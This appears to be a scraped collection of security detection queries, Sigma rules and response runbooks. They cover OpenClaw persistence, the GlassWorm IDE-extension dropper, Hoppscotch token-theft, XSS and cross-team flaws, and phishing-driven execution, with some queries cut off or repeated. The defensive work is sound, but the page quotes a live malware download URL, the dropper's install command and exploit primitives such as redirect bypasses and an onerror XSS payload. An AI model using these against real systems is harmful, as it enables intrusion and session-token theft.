1) TRIAGE: cat the plist/unit contents — confirm the ExecStart/ProgramArguments target an openclaw binary, and capture the full path + SHA256 of that binary. Pull the InitiatingProcessFileName that created the unit (typically node/npm during the postinstall). 2) CONTAIN: 'launchctl unload' the plist and 'rm' it (macOS) or 'systemctl disable --now' + 'rm' the unit (Linux). Kill any running openclaw process. Remove ~/.openclaw/ and the global npm package. Rebuild any CI runner that exhibited this. 3) HUNT: across the fleet, search for any host with the same plist/unit filename pattern. Pivot to UCs #1-#3 to chase the install vector (cline 2.3.0 lockfile?) and confirm whether credentials were accessed pre-eviction.
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where FolderPath has_any ("/Library/LaunchDaemons","/Library/LaunchAgents","/etc/systemd/system","/etc/systemd/user","/.config/systemd/user")
| where FileName has_any ("openclaw","clawdbot","moltbot") or FolderPath has_any ("openclaw","clawdbot","moltbot")
| project Timestamp, DeviceName, ActionType, FolderPath, FileName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where EventType in ("FileCreated","FileModified","FileCreate")
| where TargetFilePath matches regex @"(?i)(^|/)(Library/Launch(Daemons|Agents)|etc/systemd/(system|user)|\.config/systemd/user)/"
| where TargetFileName matches regex @"(?i)(openclaw|clawdbot|moltbot)" or TargetFilePath matches regex @"(?i)(openclaw|clawdbot|moltbot)"
| project TimeGenerated, DvcHostname, EventType, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName
| order by TimeGenerated desc
title: OpenClaw Persistence — launchd Plist / systemd Unit Drop
id: 2d9a7c4b-3f1e-4d0b-8a3c-6b9e1d4f8a90
status: experimental
description: Detects a file create/modify in macOS LaunchDaemons/LaunchAgents or Linux systemd unit directories where the file or path mentions openclaw, clawdbot, or moltbot (former names of the same project, per the article).
references:
  - https://www.stepsecurity.io/blog/cline-supply-chain-attack-detected-cline-2-3-0-silently-installs-openclaw
author: SOC Detection Engineering
date: 2026/05/20
tags:
  - attack.persistence
  - attack.t1543.004
  - attack.t1543.002
logsource:
  category: file_event
detection:
  selection_path:
    TargetFilename|contains:
      - '/Library/LaunchDaemons/'
      - '/Library/LaunchAgents/'
      - '/etc/systemd/system/'
      - '/etc/systemd/user/'
      - '/.config/systemd/user/'
  selection_name:
    TargetFilename|contains:
      - 'openclaw'
      - 'clawdbot'
      - 'moltbot'
  condition: selection_path and selection_name
falsepositives:
  - Sanctioned developer OpenClaw deployment (verify the user explicitly opted in)
level: high
(source:linux.auditd OR source:linux.syslog) (@TargetFilename:(*/Library/LaunchDaemons/* OR */Library/LaunchAgents/* OR */etc/systemd/system/* OR */etc/systemd/user/* OR */.config/systemd/user/*) OR @file.path:(*/Library/LaunchDaemons/* OR */Library/LaunchAgents/* OR */etc/systemd/system/* OR */etc/systemd/user/* OR */.config/systemd/user/*)) (@TargetFilename:(*openclaw* OR *clawdbot* OR *moltbot*) OR @file.path:(*openclaw* OR *clawdbot* OR *moltbot*))
#event_simpleName=FileWritten
| regex("(?i)(/Library/Launch(Daemons|Agents)/|/etc/systemd/(system|user)/|/\\.config/systemd/user/)", field=TargetFileName)
| regex("(?i)(openclaw|clawdbot|moltbot)", field=TargetFileName)
| groupBy([aid, ComputerName, ContextImageFileName, TargetFileName], function=count())

DeviceTvmSoftwareVulnerabilities

OAuth consent / suspicious app grant Actions on Objectives High
Cloud identity abuse: app gets high-priv scopes, often via consent phishing.

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine

| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"

            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Outbound fetch of attacker-controlled autoimport VSIX from ColossusQuailPray GitHub release
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — GlassWorm goes native: New Zig dropper infects every IDE on your machine
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] GlassWorm Zig dropper native node addon (win.node/mac.node) written to IDE extension bin/ folder · [LLM] Force-install of IDE extension via cmd.exe with --install-extension flag spawned by node host · Suspicious browser extension installation · File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Crypto-wallet file/keystore access by non-wallet process
GlassWorm Zig dropper native node addon (win.node/mac.node) written to IDE extension bin/ folder AIInstallation Medium
Hunts for the GlassWorm Zig-compiled native Node addon dropped as win.node or mac.node inside any VS Code/Cursor/Windsurf extension's bin/ subdirectory. Matches the two confirmed SHA256s from Aikido's analysis OR the filename-in-path pattern that the malicious extension uses, since GlassWorm reuses this loader trick across rebrands. Rationale: Hash and path are both directly from the Aikido article's IOC table; the SHA256s are vendor-attributed to win.node/mac.node and the path/name shape is the documented drop location (extension's ./bin/ directory). Filename matching is bounded by the IDE extension-store paths (.vscode/.cursor/.windsurf/.vscode-oss/Positron) so it remains article-specific even if the attacker rotates hashes. Cross-checked with The Hacker News and SecurityAffairs which independently corroborate the same filenames and SHA256s. Cross-checked against: • https://thehackernews.com/2026/04/glassworm-campaign-uses-zig-dropper-to.html • https://securityaffairs.com/190638/malware/glassworm-evolves-with-zig-dropper-to-infect-multiple-developer-tools.html • https://cybersecuritynews.com/trojanized-openvsx-extension-spreads-glassworm/
ATT&CKT1195.002 T1129 T1059.007

                    "112d1b33dd9b0244525f51e59e6a79ac5ae452bf6e98c310e7b4fa7902e4db44"))
      or (FileName in~ ("win.node","mac.node")
          and (FolderPath has @"\.vscode\extensions\"
               or FolderPath has @"\.vscode-oss\extensions\"
               or FolderPath has @"\.cursor\extensions\"
               or FolderPath has @"\.windsurf\extensions\"
               or FolderPath has @"\Positron\"
               or FolderPath has "/.vscode/extensions/"
               or FolderPath has "/.cursor/extensions/"
               or FolderPath has "/.windsurf/extensions/")
          and FolderPath has @"\bin")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath, FileName, SHA256

Force-install of IDE extension via cmd.exe with --install-extension flag spawned by node host AIInstallation High
Detects the GlassWorm Zig dropper's lateral-IDE infection step: the native addon shells out via cmd.exe with the distinctive `/d /e:ON /v:OFF /c` flag set to invoke the per-IDE CLI installer (code.cmd, code-insiders.cmd, cursor.cmd, windsurf.cmd, codium.cmd, positron.cmd) with `--install-extension`. Legitimate users almost never trigger extension installs from cmd.exe scripted by another process. Rationale: The exact command-line skeleton `cmd.exe /d /e:ON /v:OFF /c "<ide_path> --install-extension <vsix_path>"` is reproduced verbatim from the Aikido article. The IDE CLI list (code.cmd, code-insiders.cmd, cursor.cmd, windsurf.cmd, codium.cmd, positron.cmd) is the article's full Windows enumeration table. Combining the unusual cmd.exe flag triplet with --install-extension and a non-Explorer parent isolates programmatic force-installs from a human invoking a CLI. Cross-checked against: • https://thehackernews.com/2026/04/glassworm-campaign-uses-zig-dropper-to.html • https://cybersecuritynews.com/trojanized-openvsx-extension-spreads-glassworm/
ATT&CKT1059.003 T1195.002 T1546
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "cmd.exe"
| where ProcessCommandLine has "--install-extension"
| where ProcessCommandLine has "/d" and ProcessCommandLine has "/e:ON" and ProcessCommandLine has "/v:OFF"
| where ProcessCommandLine has_any ("code.cmd","code-insiders.cmd","cursor.cmd","windsurf.cmd","codium.cmd","positron.cmd")
| where AccountName !endswith "$"
| where InitiatingProcessFileName !in~ ("explorer.exe","msiexec.exe")
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentFile  = InitiatingProcessFileName,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildCmd    = ProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where TargetProcessName =~ "cmd.exe" or TargetProcessName endswith "\\cmd.exe"
| where TargetProcessCommandLine has "--install-extension"
| where TargetProcessCommandLine has "/d" and TargetProcessCommandLine has "/e:ON" and TargetProcessCommandLine has "/v:OFF"
| where TargetProcessCommandLine has_any ("code.cmd","code-insiders.cmd","cursor.cmd","windsurf.cmd","codium.cmd","positron.cmd")
| where ActorUsername !endswith "$"
| where ParentProcessName !in~ ("explorer.exe","msiexec.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, TargetProcessCommandLine
| order by TimeGenerated desc

Outbound fetch of attacker-controlled autoimport VSIX from ColossusQuailPray GitHub release AIDelivery High
Detects the GlassWorm second-stage payload download: the Zig dropper fetches autoimport-2.7.9.vsix from https://github.com/ColossusQuailPray/oiegjqde/releases/download/12/ to /tmp before silently installing it into every IDE. Both the GitHub username and the file path are uniquely attributed to this campaign. Rationale: The full URL `https://github.com/ColossusQuailPray/oiegjqde/releases/download/12/autoimport-2.7.9.vsix` is published in the article's IOC list; both the GitHub user `ColossusQuailPray` and the VSIX filename `autoimport-2.7.9.vsix` are unique campaign artifacts with no legitimate use, giving an essentially zero-FP signal. We also pivot through DeviceFileEvents.FileOriginUrl so the same indicator is caught even when SSL inspection is missing. Corroborated by THN and SecurityAffairs which both restate the GitHub release URL. Cross-checked against: • https://thehackernews.com/2026/04/glassworm-campaign-uses-zig-dropper-to.html • https://securityaffairs.com/190638/malware/glassworm-evolves-with-zig-dropper-to-infect-multiple-developer-tools.html • https://www.scworld.com/brief/glassworm-uses-zig-binary-to-infect-multiple-ides

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |

    spawning script-host or LOLBin children. Strongest signal when

    vendor.
references:

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("2819ea44e22b9c47049e86894e544f3fd0de1d8afc7b545314bd3bc718bf2e02", "112d1b33dd9b0244525f51e59e6a79ac5ae452bf6e98c310e7b4fa7902e4db44") or SHA1 in~ ("2819ea44e22b9c47049e86894e544f3fd0de1d8afc7b545314bd3bc718bf2e02", "112d1b33dd9b0244525f51e59e6a79ac5ae452bf6e98c310e7b4fa7902e4db44") or MD5 in~ ("2819ea44e22b9c47049e86894e544f3fd0de1d8afc7b545314bd3bc718bf2e02", "112d1b33dd9b0244525f51e59e6a79ac5ae452bf6e98c310e7b4fa7902e4db44")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("2819ea44e22b9c47049e86894e544f3fd0de1d8afc7b545314bd3bc718bf2e02", "112d1b33dd9b0244525f51e59e6a79ac5ae452bf6e98c310e7b4fa7902e4db44") or SHA1 in~ ("2819ea44e22b9c47049e86894e544f3fd0de1d8afc7b545314bd3bc718bf2e02", "112d1b33dd9b0244525f51e59e6a79ac5ae452bf6e98c310e7b4fa7902e4db44") or MD5 in~ ("2819ea44e22b9c47049e86894e544f3fd0de1d8afc7b545314bd3bc718bf2e02", "112d1b33dd9b0244525f51e59e6a79ac5ae452bf6e98c310e7b4fa7902e4db44")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["2819ea44e22b9c47049e86894e544f3fd0de1d8afc7b545314bd3bc718bf2e02", "112d1b33dd9b0244525f51e59e6a79ac5ae452bf6e98c310e7b4fa7902e4db44"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Hoppscotch device-login open redirect token theft via localhost.* / sslip.io bypass AIExploitation High
Hunts requests to Hoppscotch's /device-login endpoint where the redirect_uri parameter abuses the flawed startsWith('http://localhost') validation by using localhost.<attacker-domain> or localhost.<ip>.sslip.io to exfiltrate session tokens. Detects GHSA-7fg7-wx5q-6m3v exploitation in versions <= 2026.2.1. Rationale: Anchored on the exact bypass primitives the article documents: redirect_uri=http://localhost.<attacker>/ and the sslip.io payload (http://localhost.<attacker-ip>.sslip.io/) the Aikido agents used to verify the flaw. The startsWith('http://localhost') check passes any subdomain of an attacker-controlled domain — these two substrings are the highest-fidelity signal because legitimate device-login uses bare http://localhost/device-token. Cross-referenced GHSA-7fg7-wx5q-6m3v and PR #6012. Cross-checked against: • https://github.com/hoppscotch/hoppscotch/pull/6012 • https://intel.aikido.dev/cve/AIKIDO-2026-10462
ATT&CKT1539 T1190 T1566.002
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Internal QA testing the device-login flow with deliberately malformed URIs
  • Hoppscotch developer running an integration test that points redirect_uri to a localhost.localdomain DNS suffix
  • Pentesters or red-team exercises probing the patched build to confirm regression coverage
  • Security-research traffic from approved scanners hitting the test endpoint
Suppression filter
| where not(csUriQuery matches regex @"redirect_uri=https?(:|%3A)(/|%2F){2}localhost(:|%3A|/|%2F)")
Response runbook
1) Triage: pull the full URL and the upstream Referer/UserAgent; resolve the redirect_uri domain — sslip.io subdomains and any localhost.<external-domain> are immediate red flags. Identify the victim user via session cookie or csUserName. 2) Contain: invalidate the victim's Hoppscotch session tokens server-side, force re-authentication, and block the attacker-controlled domain at the proxy/firewall. Confirm the instance has been upgraded to >= 2026.3.0. 3) Hunt: pivot on the victim's account for any post-token activity in the last 24h (mock-server modifications, collection moves, GraphQL mutations from unfamiliar IPs); search inbound mail/chat for the phishing link that delivered the URL.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteUrl contains "/device-login"
| where RemoteUrl contains "redirect_uri"
| where RemoteUrl contains "localhost." or RemoteUrl contains "sslip.io"
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","safari.exe","opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, RemoteUrl, RemoteIP, RemotePort
W3CIISLog
| where TimeGenerated > ago(7d)
| where csUriStem contains "/device-login"
| where csUriQuery contains "redirect_uri"
| where csUriQuery contains "localhost." or csUriQuery contains "sslip.io"
| project TimeGenerated, Computer, cIP, csMethod, csUriStem, csUriQuery, csUserAgent, csUserName, scStatus
title: Hoppscotch device-login open redirect token theft
id: 7a4b3c2d-1e5f-4a6b-9c8d-0e1f2a3b4c5d
description: Detects requests to Hoppscotch /device-login with redirect_uri pointing to localhost.* subdomains or sslip.io patterns, exploiting GHSA-7fg7-wx5q-6m3v in versions <= 2026.2.1.

Hoppscotch Mock Server stored XSS via GraphQL updateRESTUserRequest content-type override AIExploitation Medium
Hunts GraphQL traffic invoking the updateRESTUserRequest mutation with a response body that sets Content-Type:text/html and embeds script-bearing markup, then correlates with subsequent GET requests to /mock/<subdomain>/ from the same client. Detects GHSA-wj4r-hr4h-g98v exploitation against versions <= 2026.2.1. Rationale: Targets the exact mutation name the article cites (updateRESTUserRequest) plus the malicious payload shape — a response header object with key:content-type and value:text/html paired with an XSS-bearing body (<img src=x onerror=...>). The Sentinel query uses a same-source-IP correlation between a /graphql POST and a subsequent /mock/ GET because Hoppscotch's mock URLs sit at /mock/<subdomain>/ and rendering them is what triggers the planted script. WAF body inspection (Datadog @http.body) gives the cleanest single-event signal. Cross-referenced GHSA-wj4r-hr4h-g98v and PR #6006. Cross-checked against: • https://github.com/hoppscotch/hoppscotch/pull/6006 • https://intel.aikido.dev/cve/AIKIDO-2026-10463
ATT&CKT1059.007 T1190 T1185
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate users updating mock-server responses via the official UI and then previewing them
  • Hoppscotch self-hosted demo / training environments where mock endpoints are exercised heavily
  • Automated end-to-end tests (Cypress, Playwright) hitting GraphQL then the rendered mock URL
  • Developers iterating on a mock that legitimately returns HTML for a webhook simulation
  • API consumers polling mock endpoints from headless browsers
Response runbook
1) Triage: dump the GraphQL POST body via the WAF and confirm a content-type:text/html header is present in the responses[] block plus an onerror/<script> payload; note the mutation's request ID and the originating user. 2) Contain: revert the malicious mock-server response via DB rollback or admin UI, invalidate any sessions that visited the /mock/<id>/ URL, and force CSP enforcement (PR #6006). Confirm the instance is upgraded to >= 2026.3.0. 3) Hunt: enumerate every account that fetched the affected /mock/ path in the last 7 days, pivot to their post-visit GraphQL activity for token misuse or collection edits, and review any data the XSS payload could have exfiltrated (collection bodies, environment variables, API keys).
let GraphqlPosts = DeviceNetworkEvents
    | where Timestamp > ago(7d)
    | where RemoteUrl contains "/graphql"
    | where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","curl.exe","python.exe","node.exe")
    | project GraphqlTime=Timestamp, DeviceId, InitiatingProcessAccountName, GraphqlUrl=RemoteUrl;
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteUrl contains "/mock/"
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","safari.exe")
| join kind=inner GraphqlPosts on DeviceId
| where Timestamp between (GraphqlTime .. GraphqlTime + 24h)
| project Timestamp, GraphqlTime, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, MockUrl=RemoteUrl, GraphqlUrl
let GraphqlPosts = W3CIISLog
    | where TimeGenerated > ago(7d)
    | where csUriStem contains "/graphql"
    | where csMethod == "POST"
    | project GraphqlTime=TimeGenerated, GraphqlIP=cIP, GraphqlUser=csUserName, GraphqlStem=csUriStem;
W3CIISLog
| where TimeGenerated > ago(7d)
| where csUriStem startswith "/mock/"
| where csMethod == "GET"
| join kind=inner GraphqlPosts on $left.cIP == $right.GraphqlIP
| where TimeGenerated between (GraphqlTime .. GraphqlTime + 24h)
| project TimeGenerated, GraphqlTime, Computer, cIP, csUserName, csUriStem, csUriQuery, csUserAgent, scStatus, GraphqlStem

Hoppscotch cross-team request injection via moveRequest GraphQL with null nextRequestID AIExploitation Medium
Hunts GraphQL POSTs invoking the MoveTeamRequest mutation where the nextRequestID variable is null and the destCollID belongs to a team the actor is not a member of, exploiting the missing GqlCollectionTeamMemberGuard check. Targets GHSA-wj4r-hr4h-g98v exploitation in versions <= 2026.2.1. Rationale: Anchored on the verbatim operationName (MoveTeamRequest) and the precise exploit primitive the article documents — variables.next set to null while destCollID points to a victim team's collection. The article calls out that nextRequestID:null causes the backend to skip the destination team check, so the null literal is the high-fidelity signal. Detection requires HTTP body capture; Sentinel uses CommonSecurityLog.Message (the WAF body sink) and Datadog uses @http.body. EDR (Defender DeviceProcessEvents, Falcon FDR) doesn't see GraphQL payloads so those slots are intentionally empty. Cross-referenced GHSA-wj4r-hr4h-g98v. Cross-checked against: • https://intel.aikido.dev/cve/AIKIDO-2026-10461
ATT&CKT1190 T1213 T1199
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate users moving a request to the end of a collection they own (nextRequestID is naturally null in that case)
  • Bulk-import scripts or migration tools repositioning requests via the GraphQL API
  • Hoppscotch admins reorganising collections after a team merge
  • Automated end-to-end tests exercising the move workflow
  • CI pipelines that rebuild collections from source-controlled API definitions
Response runbook
1) Triage: extract the requestID, destCollID, and acting user from the WAF body; query the Hoppscotch DB to confirm whether the source request's teamID differs from the destination collection's teamID — if it does, this is the cross-tenant violation the article describes. 2) Contain: revert the move by issuing a corrective moveRequest back to the original collection, audit and revoke any API keys or auth headers embedded in the moved request, and force the instance upgrade to >= 2026.3.0. Notify the impacted team. 3) Hunt: enumerate every moveRequest mutation in the last 30d, join against the team/collection ownership tables, and surface every mutation where source.teamID != destCollection.teamID — these are confirmed exploitation events. Review any subsequent requests run against the injected payload that could have exfiltrated auth headers or variables.
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestURL contains "/graphql"
| where RequestMethod == "POST"
| where Message contains "MoveTeamRequest" or Message contains "moveRequest"
| where Message contains "nextRequestID" or Message contains "\"next\":null"
| project TimeGenerated, DeviceVendor, DeviceProduct, SourceIP, SourceUserName, DestinationHostName, RequestURL, RequestMethod, RequestClientApplication, Message
source:nginx @http.method:POST @http.url:*/graphql* @http.body:(*MoveTeamRequest* OR *moveRequest*) @http.body:*destCollID* @http.body:(*"next":null* OR *nextRequestID*)
WEB
index=* (sourcetype=nginx:plus:access OR sourcetype=hoppscotch:* OR sourcetype=waf:*)
  uri_path="*/graphql*" http_method=POST
  ("MoveTeamRequest" OR "moveRequest")
  "nextRequestID" "null"
  destCollID
| rex field=_raw "\"req\"\s*:\s*\"(?<reqId>[^\"]+)\""
| rex field=_raw "\"dest\"\s*:\s*\"(?<destCollId>[^\"]+)\""
| rex field=_raw "\"next\"\s*:\s*(?<nextVal>null|\"[^\"]*\")"
| where nextVal="null"
| stats count, values(reqId) as movedRequestIds, values(destCollId) as destCollIds, dc(destCollId) as uniqueDests, earliest(_time) as first, latest(_time) as last by src, user
| where count >= 1

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
